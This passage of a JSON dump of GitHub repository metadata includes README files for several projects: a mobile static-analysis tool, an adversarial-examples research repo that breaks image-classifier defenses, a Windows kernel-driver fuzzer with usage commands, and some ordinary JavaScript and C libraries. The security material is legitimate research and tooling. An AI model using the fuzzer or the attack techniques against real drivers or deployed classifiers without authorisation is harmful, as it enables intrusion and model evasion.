src=\"https://cdnjs.cloudflare.com/ajax/libs/foundicons/3.0.0/svgs/fi-social-linkedin.svg\" alt=\"Linkedin\" width=\"40px\"/>\r\n        </a>\r\n        <a href=\"https://twitter.com/vincentcox_be\">\r\n          <img src=\"https://cdnjs.cloudflare.com/ajax/libs/foundicons/3.0.0/svgs/fi-social-twitter.svg\" alt=\"Twitter\" width=\"40px\"/>\r\n        </a>\r\n        <a href=\"https://vincentcox.com\">\r\n          <img src=\"https://cdnjs.cloudflare.com/ajax/libs/foundicons/3.0.0/svgs/fi-web.svg\" alt=\"Website\" width=\"40px\"/>\r\n        </a>\r\n      </div>\r\n    </td>\r\n  </tr>\r\n</table>\r\n\r\n## License\r\nThe following projects were used in this project:\r\n* [Materialize CSS](http://materializecss.com/): Materialize, a CSS Framework based on Material Design. Used for the general theme of the reports.\r\n* [PRISMJS](http://prismjs.com/): Lightweight, robust, elegant syntax highlighting. Used for the code markup\r\n* [JADX](https://github.com/skylot/jadx): Dex to Java decompiler. Used for decompiling .apk files\\*.\r\n* [Fancytree](https://github.com/mar10/fancytree): jQuery tree view / tree grid plugin. Used in the tree-view of the reports.\r\n* [fontawesome](http://fontawesome.io/): Font Awesome, the iconic font and CSS framework. Used for some icons.\r\n* [JSZip](https://stuk.github.io/jszip/): JSZip is a javascript library for creating, reading and editing .zip files, with a lovely and simple API.\r\n* [FileSaver](https://github.com/eligrey/FileSaver.js/): An HTML5 saveAs() FileSaver implementation.  Used in the JSZip library.\r\n\r\nAll of these projects have their corresponding licenses. Please respect these while you are modifying and redistributing this project.\r\n\r\n<p style =\"font-size: 0.6em\">*: the binary is included in this project. If the dev's from JADX are not comfortable with this, feel free to contact me about this so we can find a solution. </p>\r\n\r\n## Acknowledgments\r\n* [Kevin De Koninck](https://github.com/Kevin-De-Koninck): Git master and senpai of patience with my learning process in [pep8](https://www.python.org/dev/peps/pep-0008/).\r\n* [brakke97](https://twitter.com/skeltavik): He learned me how to hack mobile applications. This project would never exist without him.\r\n* [Aditya Gupta](https://twitter.com/adi1391): Awesome dude, really. Just keep him away from your IoT fridge or coffeemachine. Check out his [website](https://www.attify-store.com/) if you are into IoT hacking.\r\n* [Quintenvi](https://twitter.com/quintenvi): He learned me alot, also non-hacking things.\r\n* [c4b3rw0lf](https://twitter.com/c4b3rw0lf): The awesome dude behind the [VulnOS series](https://www.vulnhub.com/series/vulnos,36/).\r\n* [MacJu89](https://twitter.com/MacJu89): infra & XSS senpai\r\n\r\nMany more should be listed here, but this readme file would be TL;DR which is the worst what can happen to a readme file.\r\n","byteSize":8519},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":200},"createdAt":"2018-01-31T18:42:25Z","updatedAt":"2018-02-17T08:01:14Z","pushedAt":"2018-02-12T15:52:08Z","description":"StaCoAn is a crossplatform tool which aids developers, bugbounty hunters and ethical hackers performing static code analysis on mobile applications.","subscribersCount":{"totalCount":20},"diskUsage":22615,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":4},"pullRequestsMerged":{"totalCount":17},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":15}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":16}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":17}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}}]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":9}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":11}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":20}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":7}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":9}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":7}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":14}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":18}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":2},"issuesClosed":{"totalCount":6},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":3}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":3}}}]},"numBranches":{"totalCount":3},"numCommits":{"target":{"history":{"totalCount":91}}},"tags":{"totalCount":4},"releases":{"totalCount":4},"type":"user"},"siteAdmin":"false"},{"user":{"login":"anishathalye","followers":{"totalCount":1181},"repositories":{"totalCount":73},"following":{"totalCount":121},"location":"Cambridge, MA","organizations":{"totalCount":5},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":13},"websiteUrl":"http://www.anishathalye.com/"},"repository":{"name":"obfuscated-gradients","primaryLanguage":{"name":"Jupyter Notebook"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":24,"readme_md":{"text":"# Obfuscated Gradients Give a False Sense of Security: Circumventing Defenses to Adversarial Examples\n\n![](example.png)\n\nAbove is an [adversarial example](https://blog.openai.com/adversarial-example-research/): the slightly perturbed image of the cat fools an InceptionV3 classifier into classifying it as “guacamole”. Such “fooling images” are [easy to synthesize](http://www.anishathalye.com/2017/07/25/synthesizing-adversarial-examples/) using gradient descent ([Szegedy et al. 2013](https://arxiv.org/abs/1312.6199)).\n\nIn our recent paper, we evaluate the robustness of eight papers accepted to ICLR 2018 as non-certified white-box-secure defenses to adversarial examples. We find that seven of the eight defenses provide a limited increase in robustness and can be broken by improved attack techniques we develop.\n\nBelow is Table 1 from our paper, where we show the robustness of each accepted defense to the adversarial examples we can construct:\n\n| Defense | Dataset | Distance | Accuracy |\n|---|---|---|---|\n| [Madry et al. (2018)](https://openreview.net/forum?id=rJzIBfZAb) | CIFAR | 0.031 (linf) | 47% |\n| [Buckman et al. (2018)](https://openreview.net/forum?id=S18Su--CW) | CIFAR | 0.031 (linf) | 0%* |\n| [Ma et al. (2018)](https://openreview.net/forum?id=B1gJ1L2aW) | CIFAR | 0.031 (linf) | 5% |\n| [Guo et al. (2018)](https://openreview.net/forum?id=SyJ7ClWCb) | ImageNet | 0.005 (l2) | 0%* |\n| [Dhillon et al. (2018)](https://openreview.net/forum?id=H1uR4GZRZ) | CIFAR | 0.031 (linf) | 0% |\n| [Xie et al. (2018)](https://openreview.net/forum?id=Sk9yuql0Z) | ImageNet | 0.031 (linf) | 0%* |\n| [Song et al. (2018)](https://openreview.net/forum?id=rJUYGxbCW) | CIFAR | 0.031 (linf) | 9%* |\n| [Samangouei et al. (2018)](https://openreview.net/forum?id=BkJ3ibb0-) | MNIST | 0.005 (l2) | 0% |\n\n(Defenses denoted with * also propose combining adversarial training; we report here the defense alone. See our paper, Section 5 for full numbers.)\n\nThe only defense we observe that significantly increases robustness to adversarial examples within the threat model proposed is “Towards Deep Learning Models Resistant to Adversarial Attacks” ([Madry et al. 2018](https://arxiv.org/abs/1706.06083)), and we were unable to defeat this defense without stepping outside the threat model. Even then, this technique has been shown to be difficult to scale to ImageNet-scale ([Kurakin et al. 2016](https://arxiv.org/abs/1611.01236)). The remainder of the papers rely either inadvertently or intentionally on what we call *obfuscated gradients*. Standard attacks apply gradient descent to maximize the loss of the network on a given image to generate an adversarial example on a neural network. Such optimization methods require a useful gradient signal to succeed. When a defense obfuscates gradients, it breaks this gradient signal and causes optimization based methods to fail.\n\nWe identify three ways in which defenses cause obfuscated gradients, and construct attacks to bypass each of these cases. Our attacks are generally applicable to any defense that includes, either intentionally or or unintentionally, a non-differentiable operation or otherwise prevents gradient signal from flowing through the network. We hope future work will be able to use our approaches to perform a more thorough security evaluation.\n\n## Paper\n\n**Abstract:**\n\nWe identify obfuscated gradients as a phenomenon that leads to a false sense of security in defenses against adversarial examples. While defenses that cause obfuscated gradients appear to defeat optimization-based attacks, we find defenses relying on this effect can be circumvented.\n\nFor each of the three types of obfuscated gradients we discover, we describe indicators of defenses exhibiting this effect and develop attack techniques to overcome it. In a case study, examining all non-certified white-box-secure defenses accepted to ICLR 2018, we find obfuscated gradients are a common occurrence, with 7 of 8 defenses relying on obfuscated gradients. Using our new attack techniques, we successfully circumvent all 7 of them.\n\nFor details, read our [paper](https://arxiv.org/abs/1802.00420).\n\n## Source code\n\nThis repository contains our instantiations of the general attack techniques\ndescribed in our paper, breaking 7 of the ICLR 2018 defenses. Some of the\ndefenses didn't release source code (at the time we did this work), so we had\nto reimplement them.\n\n## Citation\n\n```\n@unpublished{obfuscated-gradients,\n  author = {Anish Athalye and Nicholas Carlini and David Wagner},\n  title = {Obfuscated Gradients Give a False Sense of Security: Circumventing Defenses to Adversarial Examples},\n  year = {2018},\n  url = {https://arxiv.org/abs/1802.00420},\n}\n```\n","byteSize":4714},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":208},"createdAt":"2018-01-31T03:13:46Z","updatedAt":"2018-02-14T15:26:19Z","pushedAt":"2018-02-05T16:33:14Z","description":"Obfuscated Gradients Give a False Sense of Security: Circumventing Defenses to Adversarial Examples","subscribersCount":{"totalCount":27},"diskUsage":6077,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":2},"issuesClosed":{"totalCount":3},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":6},"participants":{"totalCount":6}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":7}}},"tags":{"totalCount":1},"releases":{"totalCount":1},"type":"user"},"siteAdmin":"false"},{"user":{"login":"k0keoyo","followers":{"totalCount":219},"repositories":{"totalCount":83},"following":{"totalCount":20},"location":null,"organizations":{"totalCount":0},"gists":{"edges":[],"totalCount":0},"websiteUrl":"https://whereisk0shl.top"},"repository":{"name":"kDriver-Fuzzer","primaryLanguage":{"name":"C"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":83,"readme_md":{"text":"# 基于ioctlbf框架编写的驱动漏洞挖掘工具kDriver Fuzzer\n\n作者：k0shl  \n\n作者博客：https://whereisk0shl.top\n\nkDriver Fuzzer整体细节：https://whereisk0shl.top/post/2018-01-30\n\nioctlbf项目地址：https://github.com/koutto/ioctlbf\n\nkDriver Fuzzer项目地址：https://github.com/k0keoyo/kDriver-Fuzzer\n\n联系我：k0pwn_0110@sina.cn\n\n- - - - --\n\n### kDriver Fuzzer使用说明\n\n- - - - -\n首先感谢ioctlbf框架作者，我在这半年的时间阅读调试了很多优秀的fuzzer，受益良多，自己也有了很多想法，正在逐步实现。同时当我调试ioctlbf的时候发现了一些问题，于是基于ioctlbf框架，加了一些自己的想法在里面，有了这个kDriver Fuzzer，利用这个kDriver Fuzzer，我也在2017年收获了不同厂商，不同驱动近100个CVE，其实关于驱动的Fuzz很早就有人做了，我将我这个kDriver Fuzzer开源出来和大家分享共同学习（必要注释已经写在代码里了），同时春节将近，在这里给大家拜年，祝大家新年红包多多，0day多多！（由于并非是自己从头到尾写的项目，其中有部分编码习惯造成的差异（已尽量向框架作者靠拢）请大家见谅，同时代码写的还不够优雅带来的算法复杂度以及代码冗余也请大家海涵，以及一些待解决的问题未来都会逐步优化：））\n\n####一些环境说明：\n\n编译环境：Windows 10 x64 build 1607 \n\n项目IDE：VS2013\n\n测试环境：Windows 7 x86、Windows 10 x86 build 1607\n\n#### 参数介绍：\n\n\"-l\" ：开启日志记录模式（不会影响主日志记录模块）\n\n\"-s\" ：驱动枚举模块\n\n\"-d\" ：打开设备驱动的名称\n\n\"-i\" ：待Fuzz的ioctl code，默认从0xnnnn0000-0xnnnnffff\n\n\"-n\" ：在探测阶段采用null pointer模式，该模式下极易fuzz 到空指针引用漏洞，不加则常规探测模式\n\n\"-r\" ：指定明确的ioctl code范围\n\n\"-u\" ：只fuzz -i参数给定的ioctl code\n\n\"-f\" ：在探测阶段采用0x00填充缓冲区\n\n\"-q\" ：在Fuzz阶段不显示填充input buffer的数据内容\n\n\"-e\" ：在探测和fuzz阶段打印错误信息（如getlasterror()）\n\n\"-h\" ：帮助信息\n\n####常用Fuzz命令实例：\n\n##### kDriver Fuzz.exe -s\n\n进行驱动枚举，将CreateFile成功的驱动设备名称，以及部分受限的驱动设备名称打印并写入Enum Driver.txt文件中\n\n\n##### kDriver Fuzz.exe -d X -i 0xaabb0000 -f -l\n\n对X驱动的ioctl code 0xaabb0000-0xaabbffff范围进行探测及对可用的ioctl code进行fuzz，探测时除了正常探测外增加0x00填充缓冲区探测，开启数据日志记录（如增加-u参数，则只对ioctl code 0xaabb0000探测，若是有效ioctl code则进入fuzz阶段）\n\n\n##### kDriver Fuzz.exe -d X -r 0xaabb1122-0xaabb3344 -n -l\n\n对X驱动的ioctl code 0xaabb1122-0xaabb3344范围内进行探测，探测时采用null pointer模式，并数据日志记录\n\n![](https://github.com/k0keoyo/kDriver-Fuzzer/blob/master/framework.png)\n\n\n### Thanks:\n\nhttps://github.com/bee13oy/AV_Kernel_Vulns/tree/master/Zer0Con2017\n\nhttps://github.com/koutto/ioctlbf\n","byteSize":3113},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":286},"createdAt":"2018-01-31T16:09:01Z","updatedAt":"2018-02-14T12:25:01Z","pushedAt":"2018-02-01T21:05:45Z","description":null,"subscribersCount":{"totalCount":15},"diskUsage":12074,"pullRequestsOpen":{"totalCount":1},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":6}}}]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":7}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"javivelasco","followers":{"totalCount":490},"repositories":{"totalCount":28},"following":{"totalCount":51},"location":"Madrid, Spain","organizations":{"totalCount":3},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":47}}},{"node":{"comments":{"totalCount":5},"stargazers":{"totalCount":260}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":7},"websiteUrl":"http://javivelasco.com"},"repository":{"name":"react-tunnels","primaryLanguage":{"name":"JavaScript"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":4,"readme_md":{"text":"# React Tunnels 🚇 [![npm](https://img.shields.io/npm/v/react-tunnels.svg?style=flat)](https://www.npmjs.org/package/react-tunnels)[![Build Status](http://img.shields.io/travis/javivelasco/react-tunnels/master.svg?style=flat-square)](https://travis-ci.org/javivelasco/react-tunnels)\n\nRender React components in placeholders that are placed somewhere else in the component tree.\n\n## Install\n\n```\nyarn add react-tunnels\n```\n\n### Why\n\nThere is a common use case in React apps where you want to define a `Layout` where the content of some elements is defined by `children` components. For example, you want to define `Layout` just once and reuse it for every page but it has a breadcrumb whose steps depend on `children` components. This tiny library allows you to define *tunnels* to render from an element to whatever another element in the App, even elements located on top of the tree. It's like `Portal` but the target is a *component* instead of a *DOM element*.\n\n## Usage\n\nDefine a `TunnelPlaceholder` identified by an `id` and decide what properties are going to be passed to its `render` function by defining `Tunnel` components with the **same id** anywhere else in the app. If you define just a single `Tunnel` its props will be passed straight to the `render` function, if there is more than one `Tunnel` for a single `id`, the placeholder `render` function will receive an `item` argument which is an Array containing the `props` for each `Tunnel`. Let's see some examples.\n\n### Simple example: children tunneling\n\nDefine a placeholder without any render function so it will render any children coming from a `Tunnel` component with the same id.\n\n```jsx\nimport { TunnelProvider, TunnelPlaceholder, Tunnel } from 'react-tunnels'\n\nrender(\n  <TunnelProvider>\n    <div>\n      <TunnelPlaceholder id=\"my-tunnel\" />\n      <Tunnel id=\"my-tunnel\">\n        This will be rendered on the placeholder 👆\n      </Tunnel>\n    </div>\n  </TunnelProvider>\n)\n```\n\nCheck the real example [here](https://codesandbox.io/s/p79k8w0jnq)\n\n### More complex example: building a Breadcrumb\n\nIt's easy to build a breadcrumb using the prop `multiple` in the `TunnelPlaceholder`. This allows to let it know that there will be multiple tunnels so the `render` function will be called with an array of props.\n\n```jsx\nconst Breadcrumbs = () => (\n  <TunnelPlaceholder id=\"breadcrumb\" multiple>\n    {({ items }) => (\n      items.map(({ children, href }) => (\n        <span><a href={href}>{children}</a></span>\n      ))\n    )}\n  </TunnelPlaceholder>\n)\n\nconst Breadcrumb = ({ children, url }) => (\n  <Tunnel id=\"breadcrumb\" url={url}>\n    {children}\n  </Tunnel>\n)\n\nrender(\n  <TunnelProvider>\n    {/* This will render the breadcrumb */}\n    <Breadcrumbs />\n    {/* Somewhere else in children */}\n    <Breadcrumb url=\"/products\">Products</Breadcrumb>\n    <Breadcrumb url=\"/products/123\">Product <strong>123</strong></Breadcrumb>\n  </TunnelProvider>\n)\n```\n\nCheck the live example [here](https://codesandbox.io/s/0ym0n37jnl)\n\n## Similar Libraries\n\n- [React Slot Fill](https://github.com/camwest/react-slot-fill): A similar project built by [Cameron Westland](https://github.com/camwest) with a slightly different API and a bit more limited use cases. The main difference is that you can't pass content to a placeholder from multiple entry points. react-tunnels does this by passing an array with the props defined by each tunnel to the render function of the placeholder. For simple cases though, it is pretty similar.\n- [Preact Slots](https://github.com/developit/preact-slots): A library similar to React Slot Fill but for [Preact](https://github.com/developit/preact) developed by [Jason Miller](https://twitter.com/_developit).\n\n## About\n\nThis project has been developed by [Javi Velasco](https://twitter.com/javivelasco) as a way to build *Breadcrumb* components and `Layout` customizations for a variety of React projects. Any feeback, help or improvements is highly appreciated.\n\n## License\n\nThis project is licensed under the terms of the [MIT license](https://github.com/javivelasco/react-tunnels/blob/master/LICENSE).\n","byteSize":4098},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":306},"createdAt":"2018-01-31T00:40:01Z","updatedAt":"2018-02-16T20:33:37Z","pushedAt":"2018-02-12T11:25:19Z","description":"🚇 Render React components in placeholders that are placed somewhere else in the component tree.","subscribersCount":{"totalCount":2},"diskUsage":58,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":3},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":12}}},"tags":{"totalCount":3},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"ByronHsu","followers":{"totalCount":34},"repositories":{"totalCount":37},"following":{"totalCount":69},"location":"Taipei","organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":3},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":13},"websiteUrl":"https://www.facebook.com/profile.php?id=100006511962880"},"repository":{"name":"life-commit","primaryLanguage":{"name":"JavaScript"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":17,"readme_md":{"text":"<p align=\"center\">\n<img src=\"assets/LOGO.png\" width=300 >\n</p>\n\n<p align=center>\n<a target=\"_blank\" href=\"https://npmjs.org/package/life-commit\" title=\"NPM version\"><img src=\"https://img.shields.io/npm/v/life-commit.svg\"></a>\n<a target=\"_blank\" href=\"http://nodejs.org/download/\" title=\"Node version\"><img src=\"https://img.shields.io/badge/node.js-%3E=_6.0-green.svg\"></a>\n<a target=\"_blank\" href=\"https://opensource.org/licenses/MIT\" title=\"License: MIT\"><img src=\"https://img.shields.io/badge/License-MIT-blue.svg\"></a>\n<a target=\"_blank\" href=\"http://makeapullrequest.com\" title=\"PRs Welcome\"><img src=\"https://img.shields.io/badge/PRs-welcome-brightgreen.svg\"></a>\n</p>  \n\n\n> 🏃📆 Life as a git. Commit on your life.\n\n## Demo\n\n<p align=\"center\">\n<img src=\"assets/demo.gif\" width=800>\n</p>\n\n<h5 align=\"center\"><a href=\"https://www.producthunt.com/posts/life-commit\">:rocket: Discuss it on Product Hunt!</a></h5>\n\n### My Website\n\nhttps://byronhsu.github.io/life-commit/\n\n## Install\nIn order to use life-commit, make sure that you have Node version 6.0.0 or higher.\n\n```\n$ npm install -g life-commit\n```\n\n## Usage\n\n### overview\n```\n  Usage\n    $ life\n  Options\n    --init, -i                 \n    --commit, -c               \n    --log, -l                  \n    --edit , -e <commitId>      \n    --dir, -d [folder name]    \n  Examples\n    $ life --commit\n    $ life --log\n```\n### options\n\n#### ``--init`` or ``-i``\n```\n$ life --init\n```\nInitialize your life\n\n<img src=\"assets/life-i.png\" width=500>\n\n#### ``--commit`` or ``-c``\n```\n$ life --commit\n```\nCommit on your life\n\n<img src=\"assets/life-c.png\" width=500>\n\n#### ``--log`` or ``-l``\n```\n$ life --log\n```\nLog the commits on your life \n\n<img src=\"assets/life-l.png\" width=500>\n\n#### ``--edit`` or ``-e``\n```\n$ life --edit 06f302\n```\nEdit the existing commits\n\n<img src=\"assets/life-e.png\" width=500>\n\n#### ``--dir`` or ``-d``\n```\n$ life --dir myfolder\n```\nCreate a directory that visualizing the commits on webpage      \n\n<img src=\"assets/life-d.png\" width=500>\n\n## Contribute\n- Define lifemojis\n\n  All the lifemojis are stored at ``/src/data/lifemojis.json``. Comment at [issue#2](https://github.com/ByronHsu/life-commit/issues/2) with an **emoji** and **description**. Let's brainstorm and define more and more creative lifemojis together!\n  \n  Format:\n  ```js\n    {\n    \"emoji\": \"🚚\",\n    \"description\": \"Made a move\"\n    },\n    {\n    \"emoji\": \"👰\",\n    \"description\": \"Got married\"\n    },\n    {\n    \"emoji\": \"👨‍👩‍👧\",\n    \"description\": \"Had a child\"\n    },\n  ```\n- Code\n\n  Send PRs directly!\n## Credits\n\n[Elegant UI design by Bruno Rodrigues](https://codepen.io/itbruno/pen/KwarLp)\n\nCreative project [gitmoji-cli](https://github.com/carloscuesta/gitmoji-cli) and [gitmoji](https://github.com/carloscuesta/gitmoji) by [Carlos Cuesta](https://github.com/carloscuesta)\n\nLOGO desinged by [Gary Chiang](https://www.facebook.com/gary8621)","byteSize":2910},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":495},"createdAt":"2018-01-31T12:25:04Z","updatedAt":"2018-02-16T21:20:10Z","pushedAt":"2018-02-07T11:24:24Z","description":"🏃📆  Life as a git. Commit on your life.","subscribersCount":{"totalCount":10},"diskUsage":3412,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":3},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":6},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":4},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":2},"numCommits":{"target":{"history":{"totalCount":29}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"organization":{"login":"google","repositories":{"totalCount":1201},"location":null,"members":{"totalCount":1739},"websiteUrl":"https://opensource.google.com/"},"repository":{"name":"cpu_features","primaryLanguage":{"name":"C"},"license":"Apache License 2.0","isArchived":false,"hasWikiEnabled":true,"forkCount":41,"readme_md":{"text":"# cpu_features [![Build Status](https://travis-ci.org/google/cpu_features.svg?branch=master)](https://travis-ci.org/google/cpu_features) [![Build status](https://ci.appveyor.com/api/projects/status/46d1owsj7n8dsylq/branch/master?svg=true)](https://ci.appveyor.com/project/gchatelet/cpu-features/branch/master)\n\nA cross-platform C library to retrieve CPU features (such as available\ninstructions) at runtime.\n\n## Table of Contents\n\n- [Design Rationale](#rationale)\n- [Code samples](#codesample)\n- [Running sample code](#usagesample)\n- [What's supported](#support)\n- [License](#license)\n- [Build with cmake](#cmake)\n\n<a name=\"rationale\"></a>\n## Design Rationale\n\n-   **Simple to use.** See the snippets below for examples.\n-   **Extensible.** Easy to add missing features or architectures.\n-   **Compatible with old compilers** and available on many architectures so it\n    can be used widely. To ensure that cpu_features works on as many platforms\n    as possible, we implemented it in a highly portable version of C: C99.\n-   **Sandbox-compatible.** The library uses a variety of strategies to cope\n    with sandboxed environments or when `cpuid` is unavailable. This is useful\n    when running integration tests in hermetic environments.\n-   **Thread safe, no memory allocation, and raises no exceptions.**\n    cpu_features is suitable for implementing fundamental libc functions like\n    `malloc`, `memcpy`, and `memcmp`.\n-   **Unit tested.**\n\n<a name=\"codesample\"></a>\n### Checking features at runtime\n\nHere's a simple example that executes a codepath if the CPU supports both the\nAES and the SSE4.2 instruction sets:\n\n```c\n#include \"cpuinfo_x86.h\"\n\nstatic const X86Features features = GetX86Info().features;\n\nvoid Compute(void) {\n  if (features.aes && features.sse4_2) {\n    // Run optimized code.\n  } else {\n    // Run standard code.\n  }\n}\n```\n\n### Caching for faster evaluation of complex checks\n\nIf you wish, you can read all the features at once into a global variable, and\nthen query for the specific features you care about. Below, we store all the ARM\nfeatures and then check whether AES and NEON are supported.\n\n```c\n#include <stdbool.h>\n#include 